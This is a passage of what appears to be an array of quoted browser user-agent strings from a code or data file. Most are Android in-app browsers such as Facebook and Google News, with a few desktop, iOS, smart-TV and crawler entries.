"Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; RMX3263 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 12; RMX3151 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 AtContent/95.5.1864.65",
"Mozilla/5.0 (Linux; Android 9; SM-J730F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; arm_64; Android 10; CPH2069) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5725.24 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Pro) AppleWebKit/537.44 (KHTML, like Gecko) Chrome/112.0.5615.100 Mobile Safari/537.46",
"Mozilla/5.0 (Linux; Android 13; SM-A236B Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 GNews Android/2022148538",
"Mozilla/5.0 (Linux; Android 11; Mi 11 Ultra) AppleWebKit/537.44 (KHTML, like Gecko) Chrome/112.0.5615.101 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Redmi Note 11) AppleWebKit/537.44 (KHTML, like Gecko) Chrome/114.0.5735.227 Mobile Safari/537.44",
"Mozilla/5.0 (Linux; Android 9; JAT-L41 Build/HUAWEIJAT-L41; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; M2101K7BNY Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; moto g22 Build/STA32.79-77-28-50) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A326B/A326BXXU3AUH5) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.1.0; Redmi S2 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 10; M2003J15SC Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 GNews Android/2022108570",
"Mozilla/5.0 (Linux; Android 13; NTH-NX9 Build/HONORNTH-N29) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A320F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; 220333QNY Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SNE-LX1 Build/HUAWEISNE-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 11; RMX3263 Build/RP1A.201005.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; SM-A525F Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.100 Mobile Safari/537.36 GNews Android/2022143610",
"Mozilla/5.0 (Linux; Android 7.0; TRT-LX1 Build/HUAWEITRT-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 11; CPH2211 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-A336B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/370.0.0.16.116;]",
"Mozilla/5.0 (Linux; Android 11; W-K610-FRA Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; Mi 9 Lite Build/QKQ1.190828.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 GNews Android/2022148538",
"Mozilla/5.0 (Linux; Android 13; 22011119UY Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 10; SM-T595 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 12; CPH2135 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 GNews Android/2022108570",
"Mozilla/5.0 (Linux; Android 13; CPH2371 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 10; M2007J3SY Build/QKQ1.200419.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 9; TA-1021 Build/PKQ1.181105.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G75 [FBAN/FBIOS;FBDV/iPad13,17;FBMD/iPad;FBSN/iPadOS;FBSV/16.6;FBSS/2;FBID/tablet;FBLC/nl_Qaau_NL;FBOP/5];FBNV/1",
"Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/278.0.0.51.119;]",
"Mozilla/5.0 (Linux; Android 13; SM-G990B2 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.6.108;]",
"Mozilla/5.0 (Linux; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-M515F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; TECNO BF7 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; moto g62 5G Build/S1SSS32.53-85-7-4) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; arm_64; Android 10; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0165.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; Pixel 3a XL) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.10 Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5720.59 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0745.103 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; CTR-LX1; HMSCore 6.11.4.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.0.323 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; M40 Pro_EEA Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-A326B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 w2n/Android",
"Mozilla/5.0 (Linux; Android 12; M2101K7AG Build/SKQ1.210908.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (compatible; heritrix/3.4.0-20220727 +http://ya.ru/contact)",
"Mozilla/5.0 (Linux; Android 10; SM-J600FN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 13; SM-A536B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; 2107113SG Build/RKQ1.210503.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 8.1.0; CPH1903 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 8.1.0; ASUS_X00HD Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 12; LM-G810 Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; SNE-LX1 Build/HUAWEISNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; SM-F711B Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",
"Mozilla/5.0 (Linux; Android 13; 2201117PG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; Lenovo TB-J606F Build/RKQ1.210303.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 11; moto e40 Build/ROQS31.166-87-9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (Linux; Android 9; ASUS_X00QDA Build/PPR1.180610.009) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 LightSpeed [FBAN/MessengerLiteForiOS;FBAV/424.0.0.27.114;FBBV/510306677;FBDV/iPhone13,3;FBMD/iPhone;FBSN/iOS;FBSV/16.6;FBSS/3;FBCR/;FBID/phone;FBLC/it;FBOP/0]",
"Mozilla/5.0 (Linux; Android 11; SM-G973F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; 2201117SY Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; CPH2375 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; SM-A346B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.167 Mobile Safari/537.36 OPR/77.0.4095.74331",
"Mozilla/5.0 (Linux; Android 11; Nokia 2.2 Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Viva Connections for Mobile (MEE App)iPad",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 LikeWise/92.6.4345.46",
"Mozilla/5.0 (Linux; Android 13; RMX3241 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 13; 220333QNY Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (Linux; Android 12; CPH2197 Build/SKQ1.210216.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 GNews Android/2022060972",
"Mozilla/5.0 (Linux; Android 7.1.1; SM-T555 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Safari/537.36 GNews Android/2022009684",
"Mozilla/5.0 (Linux; Android 12; SM-S906B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 12; RKY-LX1 Build/HONORRKY-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 10; STS502 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 8.0.0; SM-A520F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.131 Mobile Safari/537.36 GNews Android/2022044151",
"Mozilla/5.0 (Linux; Android 8.0.0; AGS2-W09 Build/HUAWEIAGS2-W09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Safari/537.36 GNews Android/2022120648",
"Mozilla/5.0 (Linux; Android 10; motorola one Build/QPKS30.54-22-13-15) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 9; SM-A307FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (28/9; 280dpi; 720x1423; samsung; SM-A307FN; a30s; exynos7885; it_IT; 510206687)",
"Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/112.0.5615.101 Mobile Safari/537.46",
"Mozilla/5.0 (Linux; Android 12; M2007J3SG Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; CPH2471) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaBrowser/23.7.0.271.00 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 13; CPH2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.135 Mobile Safari/537.36 OPR/75.2.3978.72990",
"Mozilla/5.0 (Linux; Android 8.0.0; PRA-LX1 Build/HUAWEIPRA-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 10; ZTE A2020G Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 11; SM-A505G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; SM-A226B Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148526",
"Mozilla/5.0 (Linux; Android 9; JAT-L29 Build/HONORJAT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022150848",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 LikeWise/93.6.7475.76",
"Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 GNews Android/2022131834",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-T555 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Safari/537.36 GNews Android/2022150848",
"Opera/9.80 (Linux armv7l; HbbTV/1.2.1 (; Hisense; SmartTV_2015; V00.01.00a.H0121; HE65K5500UWTS; )) Presto/2.12.407 Version/12.51 year/2016",
"Mozilla/5.0 (Linux; Android 13; 2203129G Build/TKQ1.220807.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 9; moto e(6) plus Build/PTAS29.401-58-8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; CPH2529 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/370.0.0.16.116;]",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69 maglev/23231.413.2355.7555/49",
"Mozilla/5.0 (Linux; Android 11; RMX1993) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 LikeWise/95.6.5765.66",
"Mozilla/5.0 (Linux; Android 12; SM-G973F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; 10; HRY-LX1T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 11; M2102J20SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5545.103 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 12; ru-ru; RMX3627 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36 HeyTapBrowser/45.9.5.8.2",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 AtContent/99.5.9254.55",
"Mozilla/5.0 (Linux; arm; Android 13; RMX3521) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 YaApp_Android/23.70.1 YaSearchBrowser/23.70.1 BroPP/1.0 SA/3 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; Mi 10 Pro) AppleWebKit/537.43 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; arm_64; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5325.106 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; SM-J701MT Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-A032F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/nl_NL;FBAV/370.0.0.16.116;]",
"Mozilla/5.0 (Linux; Android 10; STK-LX1 Build/HUAWEISTK-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; M2007J3SY Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Linux; Android 12; SM-A115M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; Mi 9 Lite Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; SM-G781B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 11; CPH1941 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 10; VOG-L09 Build/HUAWEIVOG-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 16_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 BytedanceWebview/d8a21c6 musical_ly_30.8.0 JsSdk/2.0 NetType/4G Channel/App Store ByteLocale/fr Region/FR",
"Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (X11; Linux armv7l) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36 HbbTV/1.5.1 (+DRM; Philips; 32PFS6905/05; 202.005.004.001; ; _TV_MT9288_2020;) FVC/4.0 (Philips; com.tpv-tech.TPM207E;) LaTivu_1.0.1_2020",
"Mozilla/5.0 (Linux; Android 13; SM-A525F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (33/13; 420dpi; 1080x2186; samsung; SM-A525F; a52q; qcom; it_IT; 510206698)",
"Mozilla/5.0 (Linux; Android 9; SM-J530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]",
"Mozilla/5.0 (Linux; Android 10; BLA-L09 Build/HUAWEIBLA-L09S; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 Instagram 298.0.0.31.110 Android (29/10; 408dpi; 1080x2040; HUAWEI; BLA-L09; HWBLA; kirin970; it_IT; 510206667)",
"Mozilla/5.0 (Linux; Android 13; ANY-NX1 Build/HONORANY-N21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",
"Mozilla/5.0 (Linux; Android 13; 21061119DG Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 GNews Android/2022148544",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OpenWave/93.4.1073.74",
